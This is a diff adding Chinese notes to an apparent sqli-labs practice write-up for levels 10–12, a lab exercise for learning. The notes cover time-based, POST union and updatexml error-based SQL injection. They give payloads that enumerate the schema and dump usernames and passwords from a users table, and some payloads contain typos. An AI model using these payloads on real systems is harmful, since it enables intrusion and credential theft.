@@ -381,19 +381,133 @@ __很显然他是会返回错误信息的__
 
 由于每次都要手动换好几个数，可以利用sqlmap。。
 
-## 10，和9题类似，只有 单双引号的区别，不再赘述。。。
+## 10. 和9题类似，只有 单双引号的区别，不再赘述。。。
 
+![image](https://user-images.githubusercontent.com/76896357/114960633-07ec2200-9e9a-11eb-8e7a-82cdf6ab5b48.png)
 
+只有这种情况下睡眠3秒，因此猜测闭合方式是“。。
 
+## 11. POST类型的注入
 
+探水：
 
+![image](https://user-images.githubusercontent.com/76896357/114960898-8ba60e80-9e9a-11eb-9f6c-881547ef14d6.png)
 
+抓包来看一下
 
+![image](https://user-images.githubusercontent.com/76896357/114962318-0f60fa80-9e9d-11eb-92d2-b93a8ff6982b.png)
 
+这里之前输入了好多种情况，只有‘才会报错，那么估计闭合方式是‘，再看一下有没有回显
 
+* 查看回显
+```
+uname=-admin' union select 1,2#&passwd=admin&submit=Submit
+```
 
+![image](https://user-images.githubusercontent.com/76896357/114963421-4c2df100-9e9f-11eb-9889-9096449b170b.png)
 
+本来之前以为和前十一样，没想到。。。只有两列
 
+**说明有回显**
+
+* 查库
+```
+uname=-admin' union select database(),2#&passwd=admin&submit=Submit
+```
+
+* 查表
+```
+uname=-admin' union select 1,table_name from information_shema.tabes where table_schema=security #&passwd=admin&submit=Submit
+```
+
+![image](https://user-images.githubusercontent.com/76896357/114963822-26edb280-9ea0-11eb-9610-79564eb378f4.png)
+
+* 查列
+```
+uname=-admin' union select database(),group_concat(column_name) from information_schema.columns where table_name='users'#&passwd=admin&submit=Submit
+```
+![image](https://user-images.githubusercontent.com/76896357/114964056-8c41a380-9ea0-11eb-8bdc-799356b8bdd6.png)
+
+* 查字段
+
+```
+uname=-admin' union select database(),group_concat(password) from security.users #&passwd=admin&submit=Submit
+```
+
+![image](https://user-images.githubusercontent.com/76896357/114964198-d2970280-9ea0-11eb-8470-743c67459ece.png)
+
+过了
+
+## 12. POST双引号注入
+
+根据之前的经验直接进行抓包
+
+* 看看有没有报错
+
+![image](https://user-images.githubusercontent.com/76896357/114964967-4a196180-9ea2-11eb-9bdf-46395f3b513b.png)
+
+有报错，也许可以进行报错注入
+
+* 查看闭合方式
+
+![image](https://user-images.githubusercontent.com/76896357/114965197-b98f5100-9ea2-11eb-9251-046380f5712d.png)
+
+是“）的闭合方式
+
+* 试一试能不能联合查询
+
+![image](https://user-images.githubusercontent.com/76896357/114965323-f2c7c100-9ea2-11eb-94a0-fb8bec808777.png)
+
+很显然，有回显，那么和上一题几乎一样
+
+#### 接下来试一下updatexml爆错注入
+
+* 查库
+
+```
+uname=-admin") and updatexml(1,concat('^',(select database()),'^'),1)#&passwd=1&submit=Submi
+```
+![image](https://user-images.githubusercontent.com/76896357/114965654-96b16c80-9ea3-11eb-9b54-fef2caf8a761.png)
+
+* 查询所有库
+```
+uname=-admin") and updatexml(1,concat('^',(select group_concat(database()) from information_schema.schemata),'^'),1)#&passwd=1&submit=Submi
+```
+
+![image](https://user-images.githubusercontent.com/76896357/114965789-e3954300-9ea3-11eb-8a88-e79a408c4b9a.png)
+
+* 查表
+```
+uname=-admin") and updatexml(1,concat('^',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'^'),1)#&passwd=1&submit=Submi
+```
+![image](https://user-images.githubusercontent.com/76896357/114965919-28b97500-9ea4-11eb-933a-a52000908768.png)
+
+* 查列
+
+```
+uname=-admin") and updatexml(1,concat('^',(select group_concat(column_name) from information_schema.columns where table_name='users'),'^'),1)#&passwd=1&submit=Submi
+```
+
+![image](https://user-images.githubusercontent.com/76896357/114966102-7d5cf000-9ea4-11eb-9655-261e870b9bd9.png)
+
+注意这里没有全部显示出来，那么就用limit
+
+```
+uname=-admin") and updatexml(1,concat('^',(select column_name from information_schema.columns where table_name='users' limit 4,1),'^'),1)#&passwd=1&submit=Submi
+```
+因此，在这里发生了一点小插曲
+
+![image](https://user-images.githubusercontent.com/76896357/114966500-40ddc400-9ea5-11eb-89c7-fadfd419038a.png)
+
+* 查字段
+
+```
+uname=-admin") and updatexml(1,concat('^',(select group_concat(username,'~',password) from security.users),'^'),1)#&passwd=1&submit=Submi
+```
+
+这里仍然是查询不完整，再用上面的方法就好了
+
+这一关也过了。。。
 
 
 
